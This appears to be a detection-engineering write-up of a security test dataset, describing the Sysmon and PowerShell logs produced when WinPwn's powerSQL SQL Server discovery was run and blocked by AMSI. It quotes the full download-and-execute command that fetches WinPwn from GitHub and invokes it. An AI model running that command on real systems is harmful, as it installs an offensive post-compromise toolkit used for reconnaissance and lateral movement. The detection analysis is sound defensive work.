# T1518-6: Software Discovery — WinPwn - powerSQL

## Technique Context

T1518 (Software Discovery) includes enumeration of database software as a high-value post-compromise reconnaissance objective. WinPwn's `powerSQL` function discovers SQL Server instances and optionally attempts to interact with them, supporting lateral movement, data discovery, and privilege escalation via misconfigured SQL servers. SQL Server discovery is a target-rich activity in enterprise environments where SQL Server Express or developer editions may be installed on workstations without strict access controls. The delivery mechanism — `IEX(new-object net.webclient).downloadstring()` fetching WinPwn from GitHub — is identical to the other WinPwn tests in this series.

## What This Dataset Contains

The test invokes WinPwn's `powerSQL` function via the same download cradle used in T1518-4:

**Sysmon (Event ID 1, `technique_id=T1059.001`)** — The `powershell.exe` process is captured with the full command line:
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput}
```

**Sysmon (Event ID 22, DNS)** — `raw.githubusercontent.com` queried with status 0 (success), returning four GitHub CDN IPs. Unlike T1518-4 where the DNS query was attributed to `powershell.exe` (PID 28856), here the query is attributed to `<unknown process>` — a timing artifact where the process had not yet been tracked by Sysmon at the moment of resolution.

**Sysmon (Event ID 3, NetworkConnect)** — A TCP connection from `powershell.exe` (PID 6900) to `185.199.109.133:443` (GitHub CDN) is logged. This is the `powershell.exe` connection for the WinPwn download, captured with the originating process identity. This contrasts with T1518-4 where Event 3 showed Defender's cloud protection connections rather than the PowerShell process's connection.

**PowerShell (Event ID 4104)** — Two script blocks capture the download cradle with `powerSQL` as the function name.

**PowerShell (Event ID 4103)** — `New-Object net.webclient` is recorded.

**PowerShell (Event ID 4100, Error)** — AMSI blocked execution: "This script contains malicious content and has been blocked by your antivirus software. Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand". The `powerSQL` function was never executed.

**Security (Event IDs 4688, 4689, 4703)** — Process creates for `whoami.exe` and the child `powershell.exe` with full command lines.

## What This Dataset Does Not Contain

- No SQL Server discovery results — AMSI blocked execution before the `powerSQL` function ran.
- No Sysmon events related to SQL Server service queries, registry reads of SQL Server installation keys, or WMI enumeration of SQL instances.
- No network connections to SQL Server ports (1433/UDP 1434) — the scan never reached that stage.
- No Sysmon Event 3 from `MsMpEng.exe` cloud protection (present in T1518-4 but not here), suggesting timing differences in how Defender's cloud lookup resolved across the two tests.

## Assessment

This dataset is structurally equivalent to T1518-4 and provides the same detection value for the WinPwn download-and-execute pattern. The key difference is the outbound network connection (Sysmon Event 3) is attributed to `powershell.exe` here rather than `MsMpEng.exe`, which is actually more useful for detection — you can see the PowerShell process making the HTTPS connection to GitHub before AMSI fires. The pairing of DNS query (Event 22), TCP connection to GitHub CDN (Event 3), script block with `iex` + `downloadstring` (Event 4104), and AMSI block error (4100) gives a complete and well-corroborated evidence chain for the delivery mechanism, even though the intended SQL discovery never ran.

## Detection Opportunities Present in This Data

1. **Sysmon Event 3** — Outbound HTTPS from `powershell.exe` to `raw.githubusercontent.com` IPs (185.199.108-111.133) is an indicator of a download cradle; correlate with Event 22 (DNS) and Event 1 (process create with `downloadstring` argument).
2. **PowerShell 4100 with `ScriptContainedMaliciousContent`** — High-confidence indicator that AMSI fired on a downloaded or composed script; any occurrence warrants investigation.
3. **PowerShell 4104** — `iex` + `downloadstring` + `raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn` is a precise WinPwn framework indicator.
4. **Sysmon Event 22 (DNS)** — `powershell.exe` querying `raw.githubusercontent.com` is a reliable download cradle indicator regardless of which WinPwn function is invoked.
5. **PowerShell 4103** — `New-Object net.webclient` followed by an AMSI block error in the same session is a compound indicator linking the download mechanism to the detection event.
6. **Sysmon Event 1 pattern** — The `iex(new-object net.webclient).downloadstring` + WinPwn function pattern applies across T1518-4, T1518-5, and T1518-6; a single detection rule covers all three tests.
